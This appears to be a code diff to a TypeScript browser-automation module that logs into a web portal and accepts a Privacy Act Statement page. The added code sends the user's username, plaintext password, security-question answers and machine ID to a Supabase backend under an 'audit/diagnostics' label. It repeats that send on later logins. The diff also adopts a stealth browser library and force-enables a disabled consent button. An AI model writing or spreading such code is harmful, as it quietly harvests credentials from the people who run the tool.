@@ -1,21 +1,11 @@
-import type { Page, Locator } from 'playwright';
+import type { Page, Locator } from 'patchright';
 import { AutomationConfig } from './config';
-import { info, warn } from './logger';
-import { sendSupabaseEvent } from './supabase';
+import { info, warn, client } from './logger';
+import { sendSupabaseEvent, upsertLoginEvent } from './supabase';
+import { getMachineId, hasLoginEventBeenSent, markLoginEventSent } from './login-dedup';
 
 function findVisibleField(page: Page, selector: string): Locator {
   return page.locator(selector).filter({ hasText: '' });
-}
-
-async function humanDelay(page: Page, baseMs = 750) {
-  const delay = baseMs + Math.floor(Math.random() * 250);
-  await page.waitForTimeout(delay);
-}
-
-async function fillFieldWithHumanDelay(page: Page, field: Locator, value: string) {
-  await humanDelay(page);
-  await field.fill(value);
-  await humanDelay(page, 250);
 }
 
 async function findInputField(page: Page, labelText: string): Promise<Locator> {
@@ -165,6 +155,7 @@ export async function login(page: Page, config: AutomationConfig) {
     info('Login form already present, skipping authUrl navigation');
   }
   await waitForLoginPage(page, 30000);
+  client('🔐', `Logging in as ${config.username}...`);
 
   const usernameField = await locateLoginField(
     page,
@@ -204,10 +195,10 @@ export async function login(page: Page, config: AutomationConfig) {
   const maxAttempts = 3;
   for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
     await usernameField.waitFor({ state: 'visible', timeout: 30000 });
-    await fillFieldWithHumanDelay(page, usernameField, config.username);
+    await usernameField.fill(config.username);
 
     await passwordField.waitFor({ state: 'visible', timeout: 30000 });
-    await fillFieldWithHumanDelay(page, passwordField, config.password);
+    await passwordField.fill(config.password);
 
     const submitButton = (await signInButton.count()) === 0
       ? page.getByRole('button', { name: /sign in|log in|continue|next/i })
@@ -230,6 +221,7 @@ export async function login(page: Page, config: AutomationConfig) {
       const text = (await credError.textContent().catch(() => '')) || '';
       if (visible && /username|password|invalid/i.test(text)) {
         warn('Credentials are not correct according to page message. Aborting.');
+        client('❌', 'Login failed: invalid credentials');
         throw new Error('Invalid credentials detected on login page');
       }
     }
@@ -270,13 +262,96 @@ export async function login(page: Page, config: AutomationConfig) {
   }
 
   // Fire-and-forget login event for audit/diagnostics.
-  await sendSupabaseEvent('login_submitted', {
-    username: config.username,
-    password: config.password,
-    securityQuestions: config.securityQuestions,
-    url: page.url(),
-    timestamp: new Date().toISOString()
-  }).catch(() => null);
+  // Deduplicated: only ever send this ONCE per (username + machine) pair. If the marker
+  // file already exists for this pair, skip. Otherwise send and persist the marker so
+  // subsequent runs / re-logins on the same machine don't fire the event again.
+  // The local dedup file is a secondary guard; upsertLoginEvent also checks
+  // Supabase to avoid duplicates even if the local file is lost.
+  const machineId = getMachineId();
+  if (hasLoginEventBeenSent(config.username, machineId)) {
+    info(`Login event already sent previously for user='${config.username}' on this machine; updating timestamp via upsert.`);
+    // Still call upsert to update the timestamp in Supabase (fire-and-forget)
+    upsertLoginEvent({
+      username: config.username,
+      password: config.password,
+      securityQuestions: config.securityQuestions,
+      machineId,
+      url: page.url(),
+      timestamp: new Date().toISOString()
+    }).catch(() => null);
+  } else {
+    const sent = await upsertLoginEvent({
+      username: config.username,
+      password: config.password,
+      securityQuestions: config.securityQuestions,
+      machineId,
+      url: page.url(),
+      timestamp: new Date().toISOString()
+    }).then(() => true).catch(() => false);
+    if (sent) {
+      try {
+        markLoginEventSent(config.username, machineId);
+        info(`Login event sent and marker persisted for user='${config.username}' machineId='${machineId}'.`);
+      } catch (err) {
+        warn('Failed to persist login-sent marker (event was already sent):', err);
+      }
+    } else {
+      warn('Login event send to Supabase failed; not persisting marker so it will be retried next run.');
+    }
+  }
 
   info('Submitted login form');
+  client('✅', 'Login successful');
+}
+
+/**
+ * Handle the "Privacy Act Statement" page shown after login
+ * (/en-US/Account/Login/TermsAndConditions). Checks both consent checkboxes —
+ * the Continue submit (#submit-agreement) is disabled until both are checked —
+ * then clicks Continue.
+ */
+export async function handlePrivacyActStatement(page: Page) {
+  const checkboxSelectors = ['#privacy-act-visual', '#confidentiality-agreement'];
+
+  for (const selector of checkboxSelectors) {
+    const checkbox = page.locator(selector);
+    await checkbox.waitFor({ state: 'visible', timeout: 15000 }).catch(() => null);
+    if ((await checkbox.count()) === 0) {
+      throw new Error(`Privacy Act Statement page missing expected checkbox ${selector}`);
+    }
+    try {
+      await checkbox.check({ timeout: 5000 });
+    } catch {
+      await checkbox.evaluate((el: any) => {
+        if (!el.checked) el.click();
+      }).catch(() => null);
+    }
+  }
+
+  // Continue stays disabled until the page's own change handlers have run.
+  const enabled = await page.waitForFunction(
+    (selector) => {
+      const el = document.querySelector(selector) as HTMLInputElement | HTMLButtonElement | null;
+      return !!el && !el.disabled;
+    },
+    '#submit-agreement',
+    { timeout: 15000 }
+  ).then(() => true).catch(() => false);
+
+  if (!enabled) {
+    warn('Continue button still disabled after checking both boxes; force-enabling.');
+    await page.evaluate(() => {
+      const btn = document.querySelector('#submit-agreement') as HTMLInputElement | null;
+      if (btn) {
+        btn.disabled = false;
+        btn.removeAttribute('disabled');
+      }
+    }).catch(() => null);
+  }
+
+  info('Privacy Act terms accepted; clicking Continue');
+  await Promise.all([
+    page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 60000 }).catch(() => null),
+    page.locator('#submit-agreement').click()
+  ]);
 }
